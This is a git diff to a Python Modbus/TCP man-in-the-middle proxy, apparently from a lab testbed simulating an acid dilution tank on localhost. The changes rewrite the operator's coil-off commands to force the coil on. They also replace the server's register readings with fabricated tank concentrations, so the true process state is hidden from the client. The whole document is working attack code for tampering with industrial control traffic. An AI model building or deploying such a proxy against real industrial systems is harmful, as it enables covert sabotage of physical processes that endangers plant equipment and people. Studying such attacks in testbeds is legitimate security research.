@@ -16,6 +16,7 @@ import asyncio
 import logging
 import sys
 import pdb
+import json
 from tank_state import *
 
 try:
@@ -44,6 +45,8 @@ ACTUAL_SERVER_HOST = "127.0.0.1"
 ACTUAL_SERVER_PORT = 5020
 
 global changeData
+global dtDict
+global inputRate, dilutionRate, update
 
 class MITMModbusProxy:
     def __init__(self, client_host, client_port, server_host, server_port):
@@ -77,7 +80,7 @@ class MITMModbusProxy:
                     changeData = True
 
                 # Manipulate the data if needed, else pass along the normal client data
-                manipulated_data = self.transform_client_data(parsed_data_map) if changeData else data
+                manipulated_data = self.transform_client_data(parsed_data_map, spoofedTankState) if changeData else data
                 # print(manipulated_data)
                 # Forward to the server
                 server_writer.write(manipulated_data)
@@ -102,6 +105,8 @@ class MITMModbusProxy:
                         spoofedTankState.set_h_concentration(parsed_response_map["register_data"][0])
                         spoofedTankState.set_hcl_concentration(parsed_response_map["register_data"][1])
                     count = count - 1
+                    if count == 0:
+                        print(spoofedTankState.get_tank_state())
                 
                 manipulated_data = self.transform_server_data(parsed_response_map, spoofedTankState) if changeData else response
                 
@@ -127,16 +132,16 @@ class MITMModbusProxy:
         async with server:
             await server.serve_forever()
 
-    def transform_client_data(self, parsed_data_map):
+    def transform_client_data(self, parsed_data_map, spoofedTankState):
         # Case 1: if the function_code is 'Write Single Register' and the value is 0
         if parsed_data_map['function_code'] == 5:
             if parsed_data_map["coil_value"] == 0:
                 old_value = parsed_data_map["coil_value"]
-                new_value = 0xFF00
-                parsed_data_map["coil_value"] = new_value.to_bytes(2, byteorder='big')
-                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map["coil_value"]}")
+                parsed_data_map["coil_value"] = 0xFF00
+                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map["coil_value"].to_bytes(2, byteorder='big')}")
+                spoofedTankState.set_client_cmd_coil(False)
             else:
-                print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code...")
+                print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code in transform_client_data()...")
         
         # Since commands 0x01, 0x02, 0x03 are reading the state from the tank, there is no need to update/spoof the values until they are going back from the server
         elif parsed_data_map['function_code'] in [0x03, 0x02, 0x01]:
@@ -155,16 +160,22 @@ class MITMModbusProxy:
                 old_value = parsed_response_map["coil_value"]
                 new_value = 0
                 parsed_response_map["coil_value"] = new_value.to_bytes(2,byteorder='big')
-                print(f"\t**Spoofing server command: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
+                print(f"\t**Spoofing server response: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
             else:
-                print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code...")
+                print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code in transform_server_data()...")
 
         elif parsed_response_map['function_code'] == 0x03:
-            print("function code 0x03...need to update")
-        elif parsed_response_map['function_code'] == 0x02:
-            print("function code 0x02...need to update")
-        elif parsed_response_map['function_code'] == 0x01:
-            print("function code 0x01...need to update")
+            # print("function code 0x03...need to update")
+            spoofedTankState.update_state(inputRate, dilutionRate, update)
+            spoofed_reg = spoofedTankState.get_concentrations()
+            old_reg_values = parsed_response_map["register_data"]
+            parsed_response_map["register_data"] = [register for register in spoofed_reg]
+            print(f"\t**Spoofing server response: {old_reg_values} changed to {parsed_response_map["register_data"]}")
+        elif parsed_response_map['function_code'] in [0x02, 0x01]:
+            # print("function code 0x02...need to update")
+            # since the discrete_inputs and output_coils aren't used in client side calculations, there is no need to change them here.
+            # if we use them or check them, then they need spoofed
+            pass
         else:
             print(f"WARNING: Function Code {parsed_response_map['function_code']} not recognized in transform_server_data()") 
 
@@ -237,7 +248,7 @@ class MITMModbusProxy:
             return transaction_id + protocol_id + new_length + unit_id + function_code + register_addr + quantity_of_registers
         elif parsed_data_map["function_code"] in [5]:
             coil_addr = (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
-            coil_value = (parsed_data_map["coil_value"])
+            coil_value = (parsed_data_map["coil_value"]).to_bytes(2, byteorder='big')
             new_length = len(unit_id + function_code + coil_addr + coil_value).to_bytes(2, byteorder='big')
             return transaction_id + protocol_id + new_length + unit_id + function_code + coil_addr + coil_value
 
@@ -271,7 +282,31 @@ class MITMModbusProxy:
 
         return manipulated_data
 
+def update_inputs():
+    global dtDict, argFile, inputRate, dilutionRate, update
+
+    with open(argFile,'r') as rf:
+        dtDict = json.load(rf)
+
+
+    if 'inputRate' in dtDict:
+        inputRate = dtDict['inputRate'] # Rate of HCl entering tank
+
+    assert inputRate > 0.0, "inputRate should be positive"
+
+    if 'dilutionRate' in dtDict:
+        dilutionRate = dtDict['dilutionRate'] # Rate of water entering tank
+
+    assert dilutionRate > 0.0, "dilutionRate should be positive"
+
+    if 'update' in dtDict:
+        update = dtDict['update']
+
+    assert 0.0 < update < 10.0, "update should be positive and less than 10 seconds"
+
 if __name__ == "__main__":
+    argFile = 'dt.json'
+    update_inputs()
     proxy = MITMModbusProxy(
         MITM_PROXY_HOST, MITM_PROXY_PORT, ACTUAL_SERVER_HOST, ACTUAL_SERVER_PORT
     )
